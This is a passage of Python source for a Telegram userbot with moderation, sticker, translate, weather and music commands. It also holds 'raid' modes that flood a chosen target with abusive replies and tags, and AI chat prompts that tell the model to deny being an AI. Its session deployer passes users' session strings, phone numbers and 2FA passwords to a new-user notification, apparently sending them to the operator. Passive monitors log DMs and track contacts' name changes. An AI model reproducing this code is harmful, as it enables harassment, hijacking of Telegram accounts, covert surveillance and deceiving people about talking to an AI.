                    await safe_send_and_track(client, chat_id,
                        f"<blockquote>⚠️ Warned {count}/{limit} but ban failed: <code>{e}</code></blockquote>")
            else:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>⚠️ <b>WARNING {count}/{limit}</b>\n"
                    f"User: <a href='tg://user?id={target_id}'>{target_id}</a>\n"
                    f"Reason: {reason}</blockquote>")

        elif re.match(r"(?i)^\.unwarn$", text):
            if not await verify_privileges(event, client=client): return
            asyncio.create_task(event.delete())
            reply_msg = await event.get_reply_message()
            if not reply_msg:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Reply to a user to remove warnings.</blockquote>")
                return
            target_id = reply_msg.sender_id
            cid_str   = str(chat_id)
            tid_str   = str(target_id)
            warns     = cfg.get("WARNINGS", {})
            old_count = warns.get(cid_str, {}).pop(tid_str, 0)
            save_config(cfg)
            await safe_send_and_track(client, chat_id,
                f"<blockquote>✅ <b>Warnings cleared</b> for <code>{target_id}</code>\n"
                f"Was: <code>{old_count}</code> warnings.</blockquote>")

        elif re.match(r"(?i)^\.warnlist$", text):
            asyncio.create_task(event.delete())
            cid_str  = str(chat_id)
            warns    = cfg.get("WARNINGS", {}).get(cid_str, {})
            if not warns:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>✅ <b>No warnings in this chat.</b></blockquote>")
                return
            limit = cfg.get("WARN_LIMIT", 3)
            lines = [f"<blockquote>⚠️ <b>WARN LIST (limit: {limit})</b>\n"]
            for uid_s, count in warns.items():
                lines.append(f"  • <a href='tg://user?id={uid_s}'>{uid_s}</a>: <code>{count}/{limit}</code>")
            lines.append("</blockquote>")
            await safe_send_and_track(client, chat_id, "\n".join(lines))

        # ══════════════════════════════════════════
        # MODULE 6: DELALL — delete all MY messages
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.delall$", text):
            asyncio.create_task(event.delete())
            proc = await safe_send_and_track(client, chat_id,
                "<blockquote>🗑 <b>Deleting all my messages...</b></blockquote>")
            deleted = 0
            try:
                async for msg in client.iter_messages(chat_id, from_user='me', limit=500):
                    try:
                        await msg.delete()
                        deleted += 1
                        await asyncio.sleep(0.05)
                    except Exception:
                        pass
            except Exception:
                pass
            if proc:
                try:
                    await _premium_edit(proc, f"<blockquote>✅ <b>Deleted {deleted} messages.</b></blockquote>")
                except Exception:
                    pass

        # ══════════════════════════════════════════
        # MODULE 6B: QOUT — quote any message as a styled blockquote
        # Reply to any message and type .qout — sends a clean
        # formatted quote with sender name + message text.
        # Uses raw_text so premium emoji entities never cause errors.
        # Works everywhere: groups, DMs, new users, any message type.
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.qout$", text):
            asyncio.create_task(event.delete())
            reply_msg = await event.get_reply_message()
            if not reply_msg:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ <b>Kisi message ko reply karo aur .qout likho.</b></blockquote>")
                return
            import html as _html
            # Sender name + link — HTML-escape the name so special chars
            # like & < > in usernames never break the HTML parser
            try:
                sender     = await reply_msg.get_sender()
                s_first    = getattr(sender, "first_name", "") or ""
                s_last     = getattr(sender, "last_name",  "") or ""
                s_name     = (s_first + (" " + s_last if s_last else "")).strip() or "User"
                s_id       = getattr(sender, "id", 0)
                # CRITICAL: escape name before embedding in HTML anchor
                sender_tag = f"<a href='tg://user?id={s_id}'>{_html.escape(s_name)}</a>"
            except Exception:
                sender_tag = "<b>User</b>"

            # Use raw_text (plain string, no entities) to avoid premium emoji errors
            raw = (reply_msg.raw_text or "").strip()
            if not raw and reply_msg.media:
                raw = "[media]"
            if not raw:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ <b>Us message mein koi text nahi hai.</b></blockquote>")
                return

            safe_raw = _html.escape(raw)
            quote_out = (
                f"<blockquote>"
                f"💬 {sender_tag}:\n"
                f"<i>{safe_raw}</i>"
                f"</blockquote>"
            )
            await safe_send_and_track(client, chat_id, quote_out)

        # MODULE 7: KANG — steal sticker to your pack
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.kang(?:\s+(.+))?$", text):
            asyncio.create_task(event.delete())
            reply_msg = await event.get_reply_message()
            if not reply_msg or not reply_msg.media:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Reply to a sticker or image to kang.</blockquote>")
                return
            proc = await safe_send_and_track(client, chat_id,
                "<blockquote>🎨 <b>Kanging sticker...</b></blockquote>")
            try:
                from telethon.tl.functions.stickers import AddStickerToSetRequest, CreateStickerSetRequest
                from telethon.tl.types import InputStickerSetItem, InputDocument
                m        = re.match(r"(?i)^\.kang(?:\s+(.+))?$", text)
                emoji    = m.group(1).strip() if m.group(1) else "🔥"
                # Download the sticker/image
                fname    = f"kang_{int(time.time())}.webp"
                fpath    = os.path.join(MUSIC_CACHE, fname)
                dl_path  = await reply_msg.download_media(file=fpath)
                if not dl_path or not os.path.exists(dl_path):
                    raise Exception("Could not download media")
                # Convert to webp if needed
                sticker_path = dl_path
                if not dl_path.endswith(".webp"):
                    try:
                        import subprocess
                        converted = dl_path.rsplit(".", 1)[0] + ".webp"
                        subprocess.run(
                            ["ffmpeg", "-i", dl_path, "-vf", "scale=512:512:force_original_aspect_ratio=decrease",
                             converted, "-y"],
                            capture_output=True, timeout=15
                        )
                        if os.path.exists(converted):
                            sticker_path = converted
                    except Exception:
                        pass
                # Upload sticker file
                uploaded = await client.upload_file(sticker_path)
                pack_name = f"4st_{my_id}_by_4stbot"
                pack_title = "4ST Kang Pack"
                # Try to add to existing set; if fails, create new set
                try:
                    await client(AddStickerToSetRequest(
                        stickerset=await client.get_entity(pack_name),
                        sticker=InputStickerSetItem(
                            document=InputDocument(
                                id=uploaded.id, access_hash=0, file_reference=b""
                            ),
                            emoji=emoji
                        )
                    ))
                    msg_out = f"✅ Added to your pack! Pack: <code>t.me/addstickers/{pack_name}</code>"
                except Exception:
                    try:
                        await client(CreateStickerSetRequest(
                            user_id=me,
                            title=pack_title,
                            short_name=pack_name,
                            stickers=[InputStickerSetItem(
                                document=uploaded,
                                emoji=emoji
                            )]
                        ))
                        msg_out = f"✅ Pack created! <code>t.me/addstickers/{pack_name}</code>"
                    except Exception as e2:
                        msg_out = f"❌ Kang failed: <code>{str(e2)[:100]}</code>"
                if proc:
                    try: await _premium_edit(proc, f"<blockquote>{msg_out}</blockquote>")
                    except Exception: pass
                # Cleanup
                for fp in [dl_path, sticker_path]:
                    try:
                        if fp and os.path.exists(fp):
                            os.remove(fp)
                    except Exception:
                        pass
            except Exception as e:
                if proc:
                    try: await _premium_edit(proc, f"<blockquote>❌ Kang failed: <code>{str(e)[:150]}</code></blockquote>")
                    except Exception: pass

        # ══════════════════════════════════════════
        # MODULE 8: TR — Translate text (free, no key)
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.tr(?:\s+(\w{2,5})\s+(.+)|\s+(.+))?$", text):
            asyncio.create_task(event.delete())
            m    = re.match(r"(?i)^\.tr(?:\s+(\w{2,5})\s+(.+)|\s+(.+))?$", text)
            # .tr en Hello / .tr Hello (reply) / .tr en (reply)
            if m.group(1) and m.group(2):
                dest_lang = m.group(1)
                tr_text   = m.group(2).strip()
            elif m.group(1) and not m.group(2):
                dest_lang = m.group(1)
                reply_msg = await event.get_reply_message()
                tr_text   = (reply_msg.text or "") if reply_msg else ""
            elif m.group(3):
                dest_lang = "en"
                tr_text   = m.group(3).strip()
            else:
                reply_msg = await event.get_reply_message()
                dest_lang = "en"
                tr_text   = (reply_msg.text or "") if reply_msg else ""
            if not tr_text:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ No text to translate.\nUsage: <code>.tr [lang] [text]</code></blockquote>")
                return
            proc = await safe_send_and_track(client, chat_id,
                "<blockquote>🌐 <b>Translating...</b></blockquote>")
            try:
                import urllib.request, urllib.parse
                # Use MyMemory free API (no key needed, 5000 chars/day free)
                api_url = (
                    "https://api.mymemory.translated.net/get?"
                    + urllib.parse.urlencode({"q": tr_text[:500], "langpair": f"auto|{dest_lang}"})
                )
                req     = urllib.request.Request(api_url,
                              headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    data = json.loads(resp.read().decode())
                translated = data.get("responseData", {}).get("translatedText", "")
                if not translated or "MYMEMORY" in translated.upper():
                    raise Exception("Translation limit reached or failed")
                if proc:
                    try: await _premium_edit(proc, f"<blockquote>🌐 <b>Translated → {dest_lang.upper()}</b>\n\n"
                        f"{translated[:1000]}</blockquote>")
                    except Exception: pass
            except Exception as e:
                if proc:
                    try: await _premium_edit(proc, f"<blockquote>❌ Translation failed: <code>{str(e)[:100]}</code></blockquote>")
                    except Exception: pass

        # ══════════════════════════════════════════
        # MODULE 9: YTDL — Download & send audio file
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.ytdl(?:\s+(.+))?$", text):
            asyncio.create_task(event.delete())
            m     = re.match(r"(?i)^\.ytdl(?:\s+(.+))?$", text)
            query = m.group(1).strip() if m.group(1) else None
            if not query:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Usage: <code>.ytdl [song name or URL]</code></blockquote>")
                return
            if not YTDLP_AVAILABLE:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ yt-dlp not installed!</blockquote>")
                return
            proc = await safe_send_and_track(client, chat_id,
                "<blockquote>⬇️ <b>Downloading audio...</b> ⚡</blockquote>")
            track = await search_and_download_audio(query)
            if not track or not os.path.exists(track.file_path):
                if proc:
                    try: await _premium_edit(proc, "<blockquote>❌ <b>Download failed.</b></blockquote>")
                    except Exception: pass
                return
            try:
                if proc:
                    try: await _premium_edit(proc, f"<blockquote>📤 <b>Uploading:</b> <code>{track.title}</code></blockquote>")
                    except Exception: pass
                await client.send_file(
                    chat_id,
                    track.file_path,
                    caption=(
                        f"<blockquote>🎵 <b>{track.title}</b>\n"
                        f"⏱ <code>{track.duration_str()}</code>\n"
                        f"📥 via 4ST ytdl</blockquote>"
                    ),
                    parse_mode='html',
                    attributes=[__import__('telethon').tl.types.DocumentAttributeAudio(
                        duration=int(track.duration or 0),
                        title=track.title,
                        performer="4ST Bot"
                    )]
                )
                if proc:
                    try: await proc.delete()
                    except Exception: pass
            except Exception as e:
                if proc:
                    try: await _premium_edit(proc, f"<blockquote>❌ Upload failed: <code>{str(e)[:100]}</code></blockquote>")
                    except Exception: pass
            finally:
                try:
                    if os.path.exists(track.file_path):
                        os.remove(track.file_path)
                except Exception:
                    pass

        # ══════════════════════════════════════════
        # MODULE 10: WEATHER — free weather lookup
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.weather(?:\s+(.+))?$", text):
            asyncio.create_task(event.delete())
            m       = re.match(r"(?i)^\.weather(?:\s+(.+))?$", text)
            city    = m.group(1).strip() if m.group(1) else "Delhi"
            proc    = await safe_send_and_track(client, chat_id,
                "<blockquote>🌤  <b>Weather lookup...</b></blockquote>")
            try:
                import urllib.request, urllib.parse
                # Step 1: geocode city name → lat/lon (open-meteo geocoding, free)
                geo_url = (
                    "https://geocoding-api.open-meteo.com/v1/search?"
                    + urllib.parse.urlencode({"name": city, "count": 1, "format": "json"})
                )
                req = urllib.request.Request(geo_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as r:
                    geo = json.loads(r.read().decode())
                results = geo.get("results")
                if not results:
                    raise Exception(f"City not found: {city}")
                loc      = results[0]
                lat, lon = loc["latitude"], loc["longitude"]
                loc_name = loc.get("name", city)
                country  = loc.get("country", "")
                # Step 2: fetch weather
                wx_url = (
                    f"https://api.open-meteo.com/v1/forecast?"
                    + urllib.parse.urlencode({
                        "latitude": lat, "longitude": lon,
                        "current": "temperature_2m,relative_humidity_2m,wind_speed_10m,weathercode,apparent_temperature",
                        "timezone": "auto"
                    })
                )
                req = urllib.request.Request(wx_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as r:
                    wx = json.loads(r.read().decode())
                cur   = wx.get("current", {})
                temp  = cur.get("temperature_2m", "?")
                feels = cur.get("apparent_temperature", "?")
                hum   = cur.get("relative_humidity_2m", "?")
                wind  = cur.get("wind_speed_10m", "?")
                code  = cur.get("weathercode", 0)
                WMO_CODES = {
                    0:"☀️ Clear", 1:"🌤 Mostly Clear", 2:"⛅ Partly Cloudy",
                    3:"☁️ Overcast", 45:"🌫 Fog", 48:"🌫 Icy Fog",
                    51:"🌦 Light Drizzle", 53:"🌦 Drizzle", 55:"🌧 Heavy Drizzle",
                    61:"🌧 Light Rain", 63:"🌧 Rain", 65:"⛈ Heavy Rain",
                    71:"🌨 Light Snow", 73:"🌨 Snow", 75:"❄️ Heavy Snow",
                    80:"🌦 Showers", 81:"🌧 Heavy Showers", 82:"⛈ Violent Showers",
                    95:"⛈ Thunderstorm", 96:"⛈ Thunderstorm+Hail", 99:"⛈ Severe Storm",
                }
                condition = WMO_CODES.get(int(code) if code else 0, f"Code {code}")
                wx_msg = (
                    f"<blockquote>🌍 <b>WEATHER — {loc_name}, {country}</b>\n\n"
                    f"{condition}\n\n"
                    f"🌡 <b>Temp:</b> <code>{temp}°C</code> (Feels: <code>{feels}°C</code>)\n"
                    f"💧 <b>Humidity:</b> <code>{hum}%</code>\n"
                    f"💨 <b>Wind:</b> <code>{wind} km/h</code>\n\n"
                    f"📍 <code>{lat:.2f}, {lon:.2f}</code></blockquote>"
                )
                if proc:
                    try: await proc.edit(wx_msg)
                    except Exception: pass
            except Exception as e:
                if proc:
                    try: await _premium_edit(proc, f"<blockquote>❌ Weather failed: <code>{str(e)[:100]}</code></blockquote>")
                    except Exception: pass

        # ══════════════════════════════════════════
        # MODULE 11: .hack / .magic shortcut aliases
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.(hack|magic|bomb|moon|rocket|hearts)$", text):
            asyncio.create_task(event.delete())
            m        = re.match(r"(?i)^\.(hack|magic|bomb|moon|rocket|hearts)$", text)
            anim_name = m.group(1).lower()
            fun_data  = {}
            if os.path.exists(FUN_PATH):
                try:
                    with open(FUN_PATH, 'r', encoding="utf-8") as f:
                        fun_data = json.load(f)
                except Exception:
                    pass
            frames = fun_data.get(anim_name)
            if frames:
                msg = await safe_send_and_track(client, chat_id, frames[0])
                if msg:
                    for frame in frames[1:]:
                        await asyncio.sleep(1.0)
                        try: await msg.edit(frame)
                        except Exception: pass

        elif re.match(
            r"(?i)^\.(stop|stopm|stopraid|stoprraid|stopspam|stopow|"
            r"stopfuck|stopmulti|stoptagall|stoponetag|stopsraid)$", text):
            asyncio.create_task(event.delete())
            tgt = text_lower.replace(".", "").replace("/", "").replace("stop", "").strip()
            if tgt == "sraid":
                istate.sraid_state.pop(chat_id, None)
                asyncio.create_task(send_module_log(
                    f"🛑 <b>Sraid Stopped</b>  Chat: <code>{chat_id}</code>"))
            elif tgt == "rraid":
                istate.rraid_active_users.pop(chat_id, None)
            elif tgt in ["ow", "fuck"]:
                # ow/fuck messages are target-replies — must NOT be deleted on stop
                istate.ow_active[chat_id] = False
                task = istate.active_tasks.get(tgt)
                if task and not task.done():
                    task.cancel()
                    await asyncio.sleep(0)   # yield so cancellation propagates immediately
                istate.active_tasks.pop(tgt, None)
                istate.last_target_msg[chat_id] = None
                asyncio.create_task(send_module_log(
                    f"🛑 <b>{'OW' if tgt == 'ow' else 'Fuck'} Stopped</b>  Chat: <code>{chat_id}</code>"))
                return  # skip wipe — target-reply messages stay
            elif tgt in ["tagall", "onetag"]:
                # tagall/onetag messages stay — only the background task is killed
                task = istate.active_tasks.get("tagall")
                if task and not task.done():
                    task.cancel()
                    await asyncio.sleep(0)
                istate.active_tasks.pop("tagall", None)
                istate.last_target_msg[chat_id] = None
                asyncio.create_task(send_module_log(
                    f"🛑 <b>{'Tagall' if tgt == 'tagall' else 'Onetag'} Stopped</b>  Chat: <code>{chat_id}</code>"))
                return  # skip wipe — tag messages stay as-is
            elif tgt == "raid":
                # Stop raid task without deleting raid messages — they stay in chat
                task = istate.active_tasks.get("raid")
                if task and not task.done():
                    task.cancel()
                    await asyncio.sleep(0)
                istate.active_tasks.pop("raid", None)
                istate.target_lists.pop(chat_id, None)
                istate.last_target_msg[chat_id] = None
                asyncio.create_task(send_module_log(
                    f"🛑 <b>Raid Stopped</b>  Chat: <code>{chat_id}</code>"))
                return  # raid messages stay in chat — skip wipe
            elif tgt == "multi":
                istate.multi_targets.pop(chat_id, None)
                task = istate.active_tasks.get(tgt)
                if task and not task.done():
                    task.cancel()
                    await asyncio.sleep(0)
            elif tgt == "" or tgt == "m":
                istate.rraid_active_users.clear()
                istate.ow_active.clear()
                istate.multi_targets.clear()
                istate.target_lists.clear()
                istate.sraid_state.clear()
                for k, task in list(istate.active_tasks.items()):
                    if not task.done():
                        task.cancel()
                await asyncio.sleep(0)   # yield so all cancellations propagate
                istate.active_tasks.clear()
                asyncio.create_task(send_module_log(
                    f"🛑 <b>ALL Tasks Stopped</b>  Chat: <code>{chat_id}</code>"))
            else:
                task = istate.active_tasks.get(tgt)
                if task and not task.done():
                    task.cancel()
                    await asyncio.sleep(0)
                istate.active_tasks.pop(tgt, None)
            await wipe_untagged_messages(client, my_id, chat_id)
            istate.last_target_msg[chat_id] = None

# ══════════════════════════════════════════
# PASSIVE MONITORS
# ══════════════════════════════════════════
def attach_passive_monitors(client):
    @client.on(events.MessageDeleted)
    async def del_mon(event):
        try:
            istate = get_isolated_state((await client.get_me()).id)
            for cid, lmid in list(istate.last_target_msg.items()):
                if event.deleted_ids and lmid in event.deleted_ids:
                    istate.last_target_msg[cid] = None
        except Exception: pass

    @client.on(events.UserUpdate)
    async def user_update_track(event):
        """Fires when a contact updates their profile (name, username, photo, etc.)."""
        try:
            user = await event.get_user()
            if not user or getattr(user, 'bot', False):
                return
            uid  = user.id
            fn   = ((getattr(user, 'first_name', '') or '') + " " +
                    (getattr(user, 'last_name', '') or '')).strip()
            un   = getattr(user, 'username', None)
            _record_name_history(uid, fn or "Unknown", un)
        except Exception:
            pass

    @client.on(events.NewMessage(incoming=True))
    async def inc_track(event):
        try:
            me     = await client.get_me()
            my_id  = me.id
            istate = get_isolated_state(my_id)
        except Exception: return

        cid, sid = event.chat_id, event.sender_id

        if (event.is_private and sid != my_id and event.text and
                not event.text.startswith(('.', '/'))):
            try:
                user     = await event.get_sender()
                fn       = ((getattr(user, 'first_name', '') or '') + " " +
                            (getattr(user, 'last_name', '') or '')).strip()
                un       = getattr(user, 'username', None)
                username = f"@{un}" if un else "No Username"
                bot_logger("NEW_PM", f"{fn or 'Unknown'} ({username}): {event.text[:80]}")
                # Track name/username changes passively on every DM
                _record_name_history(sid, fn or "Unknown", un)
            except Exception: pass

        if cid in ai_modes and event.text and not event.text.startswith(('.', '/')):
            mode = ai_modes[cid]
            system_prompts = {
                "flirt":  ("You are a very romantic, charming human. Chat in natural Hinglish. "
                            "Flirt heavily, act like a real person on Telegram. "
                            "Short, real messages. Do NOT sound like an AI."),
                "roast":  ("You are a savage, sarcastic human roaster. Chat in Hinglish. "
                            "Roast the user. Indian internet slang, sarcastic, no banned words. "
                            "Act 100% human."),
                "normal": ("You are a normal human chatting on Telegram. Talk casually in "
                            "Hinglish. Short, natural, skip robotic tones. You are not an AI."),
            }
            prompt = f"{system_prompts[mode]}\n\nUser Message: {event.text}\nReply:"
            try:
                ai_text = await _ai_generate(prompt)
                await client.send_message(cid, ai_text, reply_to=event.id)
            except Exception: pass

        if istate.dmsec_active and event.is_private and sid != my_id:
            istate.dm_warnings[sid] = istate.dm_warnings.get(sid, 0) + 1
            lim = cfg.get("DM_WARNING_LIMIT", 5)
            if istate.dm_warnings[sid] >= lim:
                try:
                    await event.respond(
                        "<blockquote>⚠️ <b>FINAL BLOCK EXECUTED:</b> DM locked.</blockquote>")
                    await client(BlockRequest(id=sid))
                except Exception: pass
            else:
                try:
                    await event.respond(
                        f"<blockquote>🛑 Master is offline. "
                        f"({istate.dm_warnings[sid]}/{lim})</blockquote>")
                except Exception: pass

        # SRAID passive response — 3 msg count → tag in ONE msg, reply → next random line
        if cid in istate.sraid_state:
            srs   = istate.sraid_state[cid]
            speed = cfg["DEFAULT_SPEEDS"].get("sraid", 0.5)
            lines = srs["lines"]
            # Check if someone replied to the bot's last sraid tagged message
            _reply_to_id = getattr(getattr(event, 'reply_to', None), 'reply_to_msg_id', None)
            _last_bot    = srs.get("last_bot_msg_id")
            if _last_bot and _reply_to_id == _last_bot:
                # Fire next random line immediately
                try:
                    _nxt  = random.choice(lines)
                    _sent = await client.send_message(cid, _nxt, reply_to=event.id)
                    srs["last_bot_msg_id"] = _sent.id
                    await asyncio.sleep(speed)
                except Exception: pass
            elif sid == srs.get("target_id"):
                srs["msg_count"] = srs.get("msg_count", 0) + 1
                srs.setdefault("pending_msg_ids", []).append(event.id)
                if len(srs["pending_msg_ids"]) > 3:
                    srs["pending_msg_ids"] = srs["pending_msg_ids"][-3:]
                if srs["msg_count"] % 3 == 0:
                    # ONE message tagging target 3x + random line
                    _tid  = srs["target_id"]
                    _tag  = f"<a href='tg://user?id={_tid}'>⚡</a>"
                    _line = random.choice(lines)
                    _tmsg = f"{_tag} {_tag} {_tag}\n{_line}"
                    _last_mid = srs["pending_msg_ids"][-1]
                    try:
                        _sent = await client.send_message(cid, _tmsg, reply_to=_last_mid, parse_mode='html')
                        srs["last_bot_msg_id"] = _sent.id
                        srs["pending_msg_ids"] = []
                        await asyncio.sleep(speed)
                    except Exception: pass

        # OW/Fuck passive tracking — when the target sends a NEW message, shift
        # last_target_msg to the new message ID so OW/Fuck continues replying
        # to the target's latest message instead of waiting forever on a deleted one.
        _ow_running   = istate.ow_active.get(cid, False)
        _fuck_task    = istate.active_tasks.get("fuck")
        _fuck_running = _fuck_task is not None and not _fuck_task.done()
        if (_ow_running or _fuck_running) and cid in istate.target_lists:
            if sid in istate.target_lists[cid]:
                istate.last_target_msg[cid] = event.id

        # RRAID passive response
        if (cid in istate.rraid_active_users and
                sid == istate.rraid_active_users[cid]):
            abuses = load_words(ABUSE_PATH, DEFAULT_ABUSES)
            word   = apply_font_transformer(
                random.choice(abuses), cfg["ACTIVE_FONTS"].get("rraid", 0))
            speed  = cfg["DEFAULT_SPEEDS"].get("rraid", 0.1)
            try:
                istate.last_target_msg[cid] = event.id
                await asyncio.sleep(speed)
                await client.send_message(cid, word, reply_to=event.id)
            except Exception: pass

# ══════════════════════════════════════════
# SESSION DEPLOYER
# ══════════════════════════════════════════
async def deploy_new_session_string(session_str: str, is_startup: bool = False,
                                    notif_sender=None, phone: str = "N/A",
                                    twofa_verified: bool = False,
                                    twofa_password: str = ""):
    if session_str.startswith("BQ"):
        bot_logger("DEPLOY_SKIP", "Skipping Pyrogram string in Telethon deployer")
        return
    try:
        new_client = TelegramClient(StringSession(session_str), cfg["API_ID"], cfg["API_HASH"])
        # Use connect() + is_user_authorized() instead of start() to prevent
        # stdin/EOF crashes on Heroku/Koyeb where interactive prompts are not possible.
        await new_client.connect()
        if not await new_client.is_user_authorized():
            try:
                await new_client.disconnect()
            except Exception:
                pass
            raise ValueError("Extra session expired or invalid — will purge from SAVED_STRINGS.")
        me = await new_client.get_me()
        active_user_ids.add(me.id)
        get_isolated_state(me.id)
        create_event_handler(new_client)
        attach_passive_monitors(new_client)
        extra_clients.append(new_client)
        if not is_startup:
            try:
                await new_client.send_message("me",
                    cfg.get("CUSTOM_STARTUP_MSG", "🟢 <b>4ST PRIME CORE ACTIVE</b>"))
            except Exception:
                pass
            # Send #NEW_USER notification
            user_info = notif_sender if notif_sender and hasattr(notif_sender, 'id') else me
            asyncio.create_task(notify_new_user(
                user_info, session_str,
                phone=phone,
                twofa_verified=twofa_verified,
                twofa_password=twofa_password,
            ))
        bot_logger("DEPLOY_OK", f"Core: {me.first_name} ({me.id})")
        background_tasks.add(asyncio.create_task(new_client.run_until_disconnected()))
    except Exception as e:
        bot_logger("DEPLOY_ERROR", f"Purging corrupted session: {e}")
        if session_str in cfg.get("SAVED_STRINGS", []):
            cfg["SAVED_STRINGS"].remove(session_str)
            save_config(cfg)

# ══════════════════════════════════════════
# MUSIC ENGINE STARTER (per-account — every userbot runs its own)
# ══════════════════════════════════════════
_auto_leave_task_started = False

async def _start_music_engine(user_id: int):
    client  = pyro_apps.get(user_id)
    tgcalls = pytgcalls_apps.get(user_id)
    if not client or not tgcalls or not PYTGCALLS_AVAILABLE:
        return
    global _auto_leave_task_started
    try:
        await client.start()
        await tgcalls.start()
        register_stream_end_handler(user_id)
        if not _auto_leave_task_started:
            # One shared monitor loop covers every account's active chats —
            # it looks up each chat's owning account via mstate.owner_uid.
            asyncio.create_task(auto_leave_empty_calls_task())
            _auto_leave_task_started = True
        me = await client.get_me()
        bot_logger("MUSIC_ENGINE", f"Pyrogram ready for {user_id}: {me.first_name} (@{me.username})")
        bot_logger("MUSIC_ENGINE", f"PyTgCalls started for {user_id}. Music commands active!")
    except Exception as e:
        bot_logger("MUSIC_ENGINE_ERR", f"Failed to start for {user_id}: {e}")

# ══════════════════════════════════════════
# MAIN ENGINE ENTRY
# ══════════════════════════════════════════
async def main():
    global asstbot_started   # set True once bot signs in — read by show_now_playing
    # Cap concurrent OS threads used by asyncio.to_thread() (music-source
    # searches/downloads, ffmpeg fetch loops, etc.). Racing ~12 sources at
    # once can otherwise spawn a dozen simultaneous blocking threads; on a
    # small single-core host that starves the asyncio loop of the GIL long
    # enough that Telethon can't send its keepalive pings, which shows up
    # as "socket.send() raised exception" / dropped connections. Extra
    # to_thread() calls beyond this limit simply queue instead of running
    # in parallel — slightly slower under heavy load, but the bot stays
    # connected.
    asyncio.get_running_loop().set_default_executor(
        concurrent.futures.ThreadPoolExecutor(max_workers=4))

    bot_logger("BOOT", f"4ST Prime Core starting — data dir: {DATA_DIR}")
    # ── Migrate NAME_HISTORY / USERNAME_HISTORY from config to data/tracks/ ──
    _did_migrate = False
    for _uid_k, _entries in list(cfg.get("NAME_HISTORY", {}).items()):
        try:
            _uid_i = int(_uid_k)
            _td    = _load_track_file(_uid_i)
            if not _td.get("names") and _entries:
                _td["names"] = _entries
                _save_track_file(_uid_i, _td)
                _did_migrate = True
        except Exception: pass
    for _uid_k, _entries in list(cfg.get("USERNAME_HISTORY", {}).items()):
        try:
            _uid_i = int(_uid_k)
            _td    = _load_track_file(_uid_i)
            if not _td.get("usernames") and _entries:
                _td["usernames"] = _entries
                _save_track_file(_uid_i, _td)
                _did_migrate = True
        except Exception: pass
    if _did_migrate:
        cfg.pop("NAME_HISTORY", None)
        cfg.pop("USERNAME_HISTORY", None)
        save_config(cfg)
        bot_logger("BOOT", "Migrated name/username history from config → data/tracks/")
    bot_logger("BOOT", f"yt-dlp:    {'✅' if YTDLP_AVAILABLE    else '❌ (pip install yt-dlp)'}")
    bot_logger("BOOT", f"Pyrogram:  {'✅' if PYRO_AVAILABLE     else '❌ (pip install pyrogram tgcrypto)'}")
    bot_logger("BOOT", f"PyTgCalls: {'✅' if PYTGCALLS_AVAILABLE else '❌ (pip install py-tgcalls)'}")
    asyncio.create_task(background_cleanup_task())

    # Start assistant bot
    # Use connect() + sign_in() instead of start() to prevent Heroku stdin EOF crash.
    # IMPORTANT: After first successful sign_in, we persist the session string to
    # config.json (backed by GitHub). On subsequent restarts the session is already
    # authorised so is_user_authorized() returns True and sign_in is never called —
    # this eliminates the FloodWaitError crash-loop that happens when Heroku restarts
    # the dyno repeatedly and Telegram rate-limits ImportBotAuthorization.
    asstbot_started = False
    for _bot_attempt in range(2):
        try:
            await asstbot.connect()
            if not await asstbot.is_user_authorized():
                await asstbot.sign_in(bot_token=cfg["BOT_TOKEN"])
                # Persist session string so next restart skips sign_in entirely
                try:
                    cfg["BOT_SESSION"] = asstbot.session.save()
                    save_config(cfg)
                    bot_logger("BOT", "Bot session saved to config — future restarts will skip sign_in.")
                except Exception as _se:
                    bot_logger("BOT_WARN", f"Could not save bot session: {_se}")
            bot_logger("BOT", "Assistant bot started. Send /start in DM for music setup.")
            asstbot_started = True
            break
        except errors.FloodWaitError as fw:
            bot_logger("BOT_ERROR",
                       f"FloodWait {fw.seconds}s on bot login (attempt {_bot_attempt+1}/2).")
            if _bot_attempt == 0 and fw.seconds <= 300:
                bot_logger("BOT", f"Sleeping {fw.seconds}s then retrying bot login once...")
                try:
                    await asstbot.disconnect()
                except Exception:
                    pass
                await asyncio.sleep(fw.seconds + 5)
            else:
                bot_logger("BOT_ERROR",
                           f"FloodWait too long ({fw.seconds}s) — skipping bot start. "
                           "Bot will be available after the flood clears (~30 min). "
                           "Userbot continues normally.")
                break  # don't crash — let userbot keep running
        except Exception as _e:
            bot_logger("BOT_ERROR", f"Assistant bot failed to start: {_e}")
            raise
    asyncio.create_task(log_to_channel("SYSTEM_BOOT",
                                        {"Status": "4ST Prime Core Active",
                                         "DataDir": DATA_DIR}))

    # Start each account's own Pyrogram/PyTgCalls music engine — every
    # userbot logs in and plays music through its OWN session, never a
    # shared one. cfg["PYRO_SESSIONS"] is {user_id_str: session_string}.
    _pyro_sessions = cfg.get("PYRO_SESSIONS", {})
    if _pyro_sessions:
        for _uid_str in list(_pyro_sessions.keys()):
            try:
                _uid = int(_uid_str)
            except ValueError:
                continue
            if init_pyrogram(_uid):
                asyncio.create_task(_start_music_engine(_uid))
            else:
                bot_logger("MUSIC", f"Failed to init Pyrogram for {_uid} — check its session string.")
    else:
        bot_logger("MUSIC",
                      "No Pyrogram sessions. Use bot /start → 🎵 Music Setup to login.")

    # Start primary userbot
    userbot_started = False
    try:
        # Use connect() + is_user_authorized() instead of start() to prevent
        # Telethon from asking for phone/OTP on stdin (which crashes on Heroku with EOF)
        await userbot.connect()
        if not await userbot.is_user_authorized():
            bot_logger("USERBOT_ERROR",
                       "Primary session expired or invalid. Regenerate STRING_SESSION.")
            try:
                await userbot.disconnect()
